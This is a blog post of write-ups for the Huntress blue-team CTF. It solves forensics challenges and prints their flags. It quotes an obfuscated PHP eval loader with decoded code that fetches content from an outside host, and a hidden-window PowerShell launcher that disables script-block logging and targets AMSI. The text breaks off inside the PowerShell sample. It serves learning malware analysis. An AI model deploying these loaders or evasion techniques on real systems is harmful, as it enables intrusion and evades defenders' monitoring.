<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><title>CTF: Huntress CTF - Hato0 - Blog</title><meta name=Description content="Huntress CTF was a one month blue team CTF."><meta property="og:url" content="https://www.hato0.xyz/posts/ctf/huntress/">
<meta property="og:site_name" content="Hato0 - Blog"><meta property="og:title" content="CTF: Huntress CTF"><meta property="og:description" content="Huntress CTF was a one month blue team CTF."><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-10-21T00:00:00+00:00"><meta property="article:modified_time" content="2023-12-17T23:07:48+01:00"><meta property="article:tag" content="Blueteam"><meta property="article:tag" content="Redteam"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Development"><meta name=twitter:card content="summary"><meta name=twitter:title content="CTF: Huntress CTF"><meta name=twitter:description content="Huntress CTF was a one month blue team CTF."><meta name=application-name content="Hato0's journey"><meta name=apple-mobile-web-app-title content="Hato0's journey"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><link rel=icon href=https://www.hato0.xyz/favicon.ico><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=manifest href=/site.webmanifest><link rel=canonical href=https://www.hato0.xyz/posts/ctf/huntress/><link rel=prev href=https://www.hato0.xyz/posts/penetration_testing/bountease/><link rel=next href=https://www.hato0.xyz/posts/blue_team/owlguard/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"CTF: Huntress CTF","inLanguage":"en-us","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/www.hato0.xyz\/posts\/ctf\/huntress\/"},"genre":"posts","keywords":"blueteam, redteam, ctf, development","wordcount":3581,"url":"https:\/\/www.hato0.xyz\/posts\/ctf\/huntress\/","datePublished":"2023-10-21T00:00:00+00:00","dateModified":"2023-12-17T23:07:48+01:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"Hato0"},"description":"Huntress CTF was a one month blue team CTF."}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Hato0 - Blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=https://www.hato0.xyz/favicon.png data-srcset="https://www.hato0.xyz/favicon.png, https://www.hato0.xyz/favicon.png 1.5x, https://www.hato0.xyz/favicon.png 2x" data-sizes=auto alt=https://www.hato0.xyz/favicon.png title=https://www.hato0.xyz/favicon.png></a></div><div class=menu><div class=menu-inner><a class=menu-item href=/posts/>Posts </a><a class=menu-item href=/tags/>Tags </a><a class=menu-item href=/categories/>Categories </a><a class=menu-item href=/>About </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
<input type=text placeholder="Search titles or contents..." id=search-input-desktop>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-desktop title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-desktop title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-desktop><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i>
</span></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme"><i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Hato0 - Blog"><img class="lazyload logo" src=/svg/loading.min.svg data-src=https://www.hato0.xyz/favicon.png data-srcset="https://www.hato0.xyz/favicon.png, https://www.hato0.xyz/favicon.png 1.5x, https://www.hato0.xyz/favicon.png 2x" data-sizes=auto alt=https://www.hato0.xyz/favicon.png title=https://www.hato0.xyz/favicon.png></a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder="Search titles or contents..." id=search-input-mobile>
<a href=javascript:void(0); class="search-button search-toggle" id=search-toggle-mobile title=Search><i class="fas fa-search fa-fw" aria-hidden=true></i>
</a><a href=javascript:void(0); class="search-button search-clear" id=search-clear-mobile title=Clear><i class="fas fa-times-circle fa-fw" aria-hidden=true></i>
</a><span class="search-button search-loading" id=search-loading-mobile><i class="fas fa-spinner fa-fw fa-spin" aria-hidden=true></i></span></div><a href=javascript:void(0); class=search-cancel id=search-cancel-mobile>Cancel</a></div><a class=menu-item href=/posts/ title>Posts</a><a class=menu-item href=/tags/ title>Tags</a><a class=menu-item href=/categories/ title>Categories</a><a class=menu-item href=/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">CTF: Huntress CTF</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>Hato0</a></span>&nbsp;<span class=post-category>included in <a href><i class="far fa-folder fa-fw" aria-hidden=true></i></a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2023-10-21>2023-10-21</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;3581 words&nbsp;
<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;17 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#read-the-rules>Read The Rules</a></li><li><a href=#notepad>Notepad</a></li><li><a href=#technical-support>Technical Support</a></li><li><a href=#string-cheese>String Cheese</a></li><li><a href=#query-code>Query Code</a></li><li><a href=#zerion>Zerion</a></li><li><a href=#book-by-its-cover>Book By Its Cover</a></li><li><a href=#humantwo>HumanTwo</a></li><li><a href=#hot-off-the-press>Hot Off The Press</a></li><li><a href=#baseffff1>BaseFFFF+1</a></li><li><a href=#traffic>Traffic</a></li><li><a href=#caesarmirror>CaesarMirror</a></li><li><a href=#i-wont-let-you-down>I Wont Let You Down</a></li><li><a href=#php-stagger>PHP Stagger</a></li><li><a href=#dialtone>Dialtone</a></li><li><a href=#layered-security>Layered Security</a></li><li><a href=#backdoored-splunk>Backdoored Splunk</a></li><li><a href=#dumpster-fire>Dumpster Fire</a></li><li><a href=#comprezz>Comprezz</a></li><li><a href=#where-am-i>Where am I?</a></li><li><a href=#chicken-wings>Chicken Wings</a></li><li><a href=#wimble>Wimble</a></li><li><a href=#f12>F12</a></li><li><a href=#veebeeeee>VeeBeeEee</a></li><li><a href=#baking>Baking</a></li><li><a href=#snake-oil>Snake Oil</a></li><li><a href=#crab>Crab</a></li></ul></nav></div></div><div class=content id=content><h1 id=huntress-writeup>Huntress Writeup</h1><p>Each challenges successfully solved will be explained here. The solution will not only be put in writing but also the way of thinking and failed tries will be described.</p><p>Unfortunately, took too long to write it (didn&rsquo;t took note &mldr;) so wasn&rsquo;t able to re-do all the challenges before the server shutdown.</p><h2 id=read-the-rules>Read The Rules</h2><p>This challenge is pretty straight forward.
Read the rules using the view-source utility and you will find a commented html line with the flag.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/readtherules.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/readtherules.png, https://www.hato0.xyz/images/ctf/huntress/readtherules.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/readtherules.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/readtherules.png title="commented html line"></p><p><em>flag: flag{90bc54705794a62015369fd8e86e557b}</em></p><h2 id=notepad>Notepad</h2><p>To solve this challenge we will first check what&rsquo;s file we have using the file command.</p><p>We can see that the file contains UTF-8 Unicode text:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/notepad1.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/notepad1.png, https://www.hato0.xyz/images/ctf/huntress/notepad1.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/notepad1.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/notepad1.png title="UTF-8 Text"></p><p>We can just go ahead an cat the file, here goes the flag.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/notepad2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/notepad2.png, https://www.hato0.xyz/images/ctf/huntress/notepad2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/notepad2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/notepad2.png title="Cat file"></p><p><em>flag: flag{2dd41e3da37ef1238954d8e7f3217cd8}</em></p><h2 id=technical-support>Technical Support</h2><p>You just need to join the discord and you will have a flag in the technical support channel.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/technicalSupport.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/technicalSupport.png, https://www.hato0.xyz/images/ctf/huntress/technicalSupport.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/technicalSupport.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/technicalSupport.png title="Discord flag"></p><p><em>flag: flag{a98373a74abb8c5ebb8f5192e034a91c}</em></p><h2 id=string-cheese>String Cheese</h2><p>We will start by checking if the file is a real png or not. Do to so we will be using the &ldquo;file&rdquo; command.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/stringCheese.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/stringCheese.png, https://www.hato0.xyz/images/ctf/huntress/stringCheese.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/stringCheese.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/stringCheese.png title="file Cheese"></p><p>When opening the file, we are not able to see anything appear from the png.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/stringCheese2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/stringCheese2.png, https://www.hato0.xyz/images/ctf/huntress/stringCheese2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/stringCheese2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/stringCheese2.png title="PNG Cheese"></p><p>From there we will be looking at the strings inside the png flag to check for hidden data:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/stringCheese3.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/stringCheese3.png, https://www.hato0.xyz/images/ctf/huntress/stringCheese3.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/stringCheese3.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/stringCheese3.png title="PNG Cheese"></p><p>Got it. Flags was hidden in the PNG file data.</p><p><em>flag: flag{f4d9f0f70bf353f2ca23d81dcf7c9099}</em></p><h2 id=query-code>Query Code</h2><p>As always we will start by checking what&rsquo;s the file data are using &ldquo;file&rdquo; command.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/queryCode1.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/queryCode1.png, https://www.hato0.xyz/images/ctf/huntress/queryCode1.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/queryCode1.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/queryCode1.png title="File QueryCode"></p><p>So the file looks to be a PNG file.
We will move ahead by renaming the <code>query_code</code> to <code>query_code.png</code> and open it.
We are presented with a QRCode.</p><p>Moving through and checking the QRCode value, a text that appears to be the flag was the content of it:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/queryCode2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/queryCode2.png, https://www.hato0.xyz/images/ctf/huntress/queryCode2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/queryCode2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/queryCode2.png title="Flag QueryCode"></p><p><em>flag: flag{3434cf5dc6a865657ea1ec1cb675ce3b}</em></p><h2 id=zerion>Zerion</h2><p>We are presented with a PHP file that seems to be obfuscated. This file contains two parts. The first part is a PHP code and the second part is a long string that looks like a reverse base64.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> <span class=nv>$L66Rgr</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;Pz4=&#34;</span><span class=p>),</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>));</span> <span class=nv>$L6CRgr</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;L3gvaQ==&#34;</span><span class=p>),</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;eA==&#34;</span><span class=p>),</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>strrev</span><span class=p>(</span><span class=nx>str_rot13</span><span class=p>(</span><span class=nv>$L66Rgr</span><span class=p>[</span><span class=mi>1</span><span class=p>]))));</span><span class=nv>$L7CRgr</span> <span class=o>=</span> <span class=s2>&#34;d6d666e70e43a3aeaec1be01341d9f9d&#34;</span><span class=p>;</span><span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$L6CRgr</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=nx>serialize</span><span class=p>(</span><span class=k>eval</span><span class=p>(</span><span class=nv>$L6CRgr</span><span class=p>[</span><span class=mi>2</span><span class=p>])),</span><span class=nv>$L6CRgr</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span><span class=k>exit</span><span class=p>();</span><span class=cp>?&gt;</span><span class=err>==Dstfmoz5JnxNvolIUqyWUV7xFXa0lWtbQVaD1Wt8QVcNQZlNQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlW0qPV/NFXjNwZjtUZtLPVm1zpyOUWbtPV/NFXkNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXlNQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/NFX0NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xFXa0lWtbQVaZ1Wt8QVcNQZ0NQrjNvWtZKolITpxtPXtbQVcNlW4qPV6NlWmqPV/NFXjNQAjtUZtLPVm1zpyOUWbtPV/NFX4NQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlW3qPV/NFXjRQZjtUZtLPVm1zpyOUWbtPV94PViMzocEPV7xlWgpPV6NlWlqPV/
</span></span></span><span class=line><span class=cl><span class=err>[...]
</span></span></span></code></pre></div><p>Reformating this code it produce a decoding routine.</p><pre><code><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span> 
</span></span><span class=line><span class=cl><span class=nv>$payload</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;Pz4=&#34;</span><span class=p>),</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>));</span> <span class=c1>#get the variable by reading the file content and splitting on &#34;?&gt;&#34;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$payload</span><span class=o>=</span><span class=k>array</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;L3gvaQ==&#34;</span><span class=p>),</span><span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;eA==&#34;</span><span class=p>),</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nx>strrev</span><span class=p>(</span><span class=nx>str_rot13</span><span class=p>(</span><span class=nv>$payload</span><span class=p>[</span><span class=mi>1</span><span class=p>]))));</span> <span class=c1>#payload[1] is corresponding to the long string and his decode using the routine : ROT13 -&gt; Reverse -&gt; B64 decode
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$L7CRgr</span> <span class=o>=</span> <span class=s2>&#34;d6d666e70e43a3aeaec1be01341d9f9d&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$payload</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=nx>serialize</span><span class=p>(</span><span class=k>eval</span><span class=p>(</span><span class=nv>$payload</span><span class=p>[</span><span class=mi>2</span><span class=p>])),</span><span class=nv>$payload</span><span class=p>[</span><span class=mi>1</span><span class=p>]);</span> <span class=c1>#replacing the php code after execution
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>exit</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>   
</span></span></span></code></pre></div></code></pre><p>By using Cyberchef we are able to replicate the routine and get the executed payload.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/zerion.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/zerion.png, https://www.hato0.xyz/images/ctf/huntress/zerion.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/zerion.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/zerion.png title=Zerion></p><pre><code><div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=line><span class=cl>function GC($a)
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>$url = sprintf(&#39;%s?api=%s<span class=err>&amp;</span>ac=%s<span class=err>&amp;</span>path=%s<span class=err>&amp;</span>t=%s&#39;, $a, $_REQUEST[&#39;api&#39;], $_REQUEST[&#39;ac&#39;], $_REQUEST[&#39;path&#39;], $_REQUEST[&#39;t&#39;]); $code = @file_get_contents($url); if ($code == false) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, &#39;ll&#39;); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_TIMEOUT, 100); curl_setopt($ch, CURLOPT_FRESH_CONNECT, TRUE); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); $code = curl_exec($ch); curl_close($ch); }return $code;}
</span></span><span class=line><span class=cl>if (isset($_REQUEST[&#39;ac&#39;]) <span class=err>&amp;&amp;</span> isset($_REQUEST[&#39;path&#39;]) <span class=err>&amp;&amp;</span> isset($_REQUEST[&#39;api&#39;]) <span class=err>&amp;&amp;</span> isset($_REQUEST[&#39;t&#39;])) { $code = GC(&#39;https://c.-wic5-.com/&#39;); if(!$code){$code = GC(&#39;https://c.-oiv3-.com/?flag=flag{af10370d485952897d5183aa09e19883}
</span></span><span class=line><span class=cl>&#39;);}$need = 
</span></span><span class=line><span class=cl>[...]</span></span></code></pre></div></code></pre><p>And we can identify the flag.</p><p><em>flag: flag{af10370d485952897d5183aa09e19883}</em></p><h2 id=book-by-its-cover>Book By Its Cover</h2><p>We are presented with a file that have a <code>.rar</code> extention.
As always verify the file type with the <code>file</code> command.</p><p>It appears to be a PNG and not a RAR so we will go ahead and rename it.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/bookCover.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/bookCover.png, https://www.hato0.xyz/images/ctf/huntress/bookCover.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/bookCover.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/bookCover.png title="Book file"></p><p>Opening it we can see that it&rsquo;s in fact a PNG and more than that the flag !</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/bookCover2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/bookCover2.png, https://www.hato0.xyz/images/ctf/huntress/bookCover2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/bookCover2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/bookCover2.png title="CTF Book"></p><p><em>flag: flag{f8d32a346745a6c4bf4e9504ba5308f0}</em></p><h2 id=humantwo>HumanTwo</h2><p>We are presented with a zip file that contains lot of webshells.<br>In the chall introduction we can see that we need to spot the difference in the different files.</p><p>So starting from there we will unzip ressources and perform a diff on it.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/human1.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/human1.png, https://www.hato0.xyz/images/ctf/huntress/human1.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/human1.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/human1.png title="Human Two check"></p><p>To perform the diff we will use the following command :</p><pre><code><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=k>for</span> i in ./*<span class=p>;</span> <span class=k>do</span> diff <span class=s2>&#34;</span><span class=nv>$i</span><span class=s2>&#34;</span> 0019de2359fe758b0c7cd04c361dfbb798a1d897f3e67de3756645b423dbfe3f<span class=p>;</span> <span class=k>done</span></span></span></code></pre></div></code></pre><p>We spot a line that looks different that the others :</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/human2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/human2.png, https://www.hato0.xyz/images/ctf/huntress/human2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/human2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/human2.png title="Human Two check"></p><p>Analysing the found line (<code>if (!String.Equals(pass, "666c6167-7b36-6365-3666-366131356464"+"64623065-6262-3333-3262-666166326230"+"62383564-317d-0000-0000-000000000000"))</code>) we can spot a guid looking like an Hex string.
Moving from there, you can use cyberchef to decode it as shown below:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/human3.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/human3.png, https://www.hato0.xyz/images/ctf/huntress/human3.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/human3.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/human3.png title="Human Two check"></p><p>And here is the flag !</p><p><em>flag: flag{6ce6f6a15dddb0ebb332bfaf2b0b85d1}</em></p><h2 id=hot-off-the-press>Hot Off The Press</h2><p>The given file does have an extension but the challenge introduction specify an archive password. So we will go ahead and identify the file type and rename it accordingly.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/hotOfPress.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/hotOfPress.png, https://www.hato0.xyz/images/ctf/huntress/hotOfPress.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/hotOfPress.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/hotOfPress.png title="hotOfPress identification"></p><p>Using WinUHA we can extract the content of it and find a powershell script.</p><p><img class=lazyload src=/svg/loading.min.svg data-src=https://www.hato0.xyz/images/ctf/huntress/hotOfPress2.png data-srcset="https://www.hato0.xyz/images/ctf/huntress/hotOfPress2.png, https://www.hato0.xyz/images/ctf/huntress/hotOfPress2.png 1.5x, https://www.hato0.xyz/images/ctf/huntress/hotOfPress2.png 2x" data-sizes=auto alt=https://www.hato0.xyz/images/ctf/huntress/hotOfPress2.png title="hotOfPress extract"></p><p>The powershell file contains obfuscated command lines that we will need to decode.</p><p>Original:<div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=n>C:</span><span class=p>\</span><span class=n>Windows</span><span class=p>\</span><span class=n>SysWOW64</span><span class=p>\</span><span class=n>cmd</span><span class=p>.</span><span class=py>exe</span> <span class=p>/</span><span class=n>c</span> <span class=n>powershell</span><span class=p>.</span><span class=py>exe</span> <span class=n>-nop</span> <span class=n>-w</span> <span class=n>hidden</span> <span class=n>-noni</span> <span class=n>-c</span> <span class=k>if</span><span class=p>([</span><span class=no>IntPtr</span><span class=p>]::</span><span class=n>Size</span> <span class=o>-eq</span> <span class=mf>4</span><span class=p>){</span><span class=nv>$b</span><span class=p>=</span><span class=nv>$env:windir</span><span class=p>+</span><span class=s1>&#39;\sysnative\WindowsPowerShell\v1.0\powershell.exe&#39;</span><span class=p>}</span><span class=k>else</span><span class=p>{</span><span class=nv>$b</span><span class=p>=</span><span class=s1>&#39;powershell.exe&#39;</span><span class=p>};</span><span class=nv>$s</span><span class=p>=</span><span class=nb>New-Object</span> <span class=n>System</span><span class=p>.</span><span class=py>Diagnostics</span><span class=p>.</span><span class=n>ProcessStartInfo</span><span class=p>;</span><span class=nv>$s</span><span class=p>.</span><span class=n>FileName</span><span class=p>=</span><span class=nv>$b</span><span class=p>;</span><span class=nv>$s</span><span class=p>.</span><span class=n>Arguments</span><span class=p>=</span><span class=s1>&#39;-noni -nop -w hidden -c $x_wa3=((&#39;&#39;Sc&#39;&#39;+&#39;&#39;{2}i&#39;&#39;+&#39;&#39;pt{1}loc{0}Logg&#39;&#39;+&#39;&#39;in&#39;&#39;+&#39;&#39;g&#39;&#39;)-f&#39;&#39;k&#39;&#39;,&#39;&#39;B&#39;&#39;,&#39;&#39;r&#39;&#39;);If($PSVersionTable.PSVersion.Major -ge 3){ $sw=((&#39;&#39;E&#39;&#39;+&#39;&#39;nable{3}&#39;&#39;+&#39;&#39;c{&#39;&#39;+&#39;&#39;1}&#39;&#39;+&#39;&#39;ip{0}Bloc{2}Logging&#39;&#39;+&#39;&#39;&#39;&#39;)-f&#39;&#39;t&#39;&#39;,&#39;&#39;r&#39;&#39;,&#39;&#39;k&#39;&#39;,&#39;&#39;S&#39;&#39;); $p8=[Collections.Generic.Dictionary[string,System.Object]]::new(); $gG0=((&#39;&#39;Ena&#39;&#39;+&#39;&#39;ble{2}c{5}i{3}t{&#39;&#39;+&#39;&#39;4}loc&#39;&#39;+&#39;&#39;{0}{1}&#39;&#39;+&#39;&#39;nv&#39;&#39;+&#39;&#39;o&#39;&#39;+&#39;&#39;cationLoggi&#39;&#39;+&#39;&#39;ng&#39;&#39;)-f&#39;&#39;k&#39;&#39;,&#39;&#39;I&#39;&#39;,&#39;&#39;S&#39;&#39;,&#39;&#39;p&#39;&#39;,&#39;&#39;B&#39;&#39;,&#39;&#39;r&#39;&#39;); $jXZ4D=[Ref].Assembly.GetType(((&#39;&#39;{0}y&#39;&#39;+&#39;&#39;s&#39;&#39;+&#39;&#39;tem.{1}a&#39;&#39;+&#39;&#39;n&#39;&#39;+&#39;&#39;a{4}ement.A{5}t&#39;&#39;+&#39;&#39;omati&#39;&#39;+&#39;&#39;on.{2&#39;&#39;+&#39;&#39;}ti{3}s&#39;&#39;)-f&#39;&#39;S&#39;&#39;,&#39;&#39;M&#39;&#39;,&#39;&#39;U&#39;&#39;,&#39;&#39;l&#39;&#39;,&#39;&#39;g&#39;&#39;,&#39;&#39;u&#39;&#39;)); $plhF=[Ref].Assembly.GetType(((&#39;&#39;{&#39;&#39;+&#39;&#39;6}{&#39;&#39;+&#39;&#39;5}stem.&#39;&#39;+&#39;&#39;{&#39;&#39;+&#39;&#39;3&#39;&#39;+&#39;&#39;}{9}&#39;&#39;+&#39;&#39;n{9}{&#39;&#39;+&#39;&#39;2}ement&#39;&#39;+&#39;&#39;.{&#39;&#39;+&#39;&#39;8}{&#39;&#39;+&#39;&#39;4}t{&#39;&#39;+&#39;&#39;7&#39;&#39;+&#39;&#39;}&#39;&#39;+&#39;&#39;m{9}ti{7}n&#39;&#39;+&#39;&#39;.&#39;&#39;+&#39;&#39;{8&#39;&#39;+&#39;&#39;}&#39;&#39;+&#39;&#39;m&#39;&#39;+&#39;&#39;si{0&#39;&#39;+&#39;&#39;}ti{&#39;&#39;+&#39;&#39;1}s&#39;&#39;)-f&#39;&#39;U&#39;&#39;,&#39;&#39;l&#39;&#39;,&#39;&#39;g&#39;&#39;,&#39;&#39;M&#39;&#39;,&#39;&#39;u&#39;&#39;,&#39;&#39;y&#39;&#39;,&#39;&#39;S&#39;&#39;,&#39;&#39;o&#39;&#39;,&#39;&#39;A&#39;&#39;,&#39;&#39;a&#39;&#39;)); if ($plhF) { 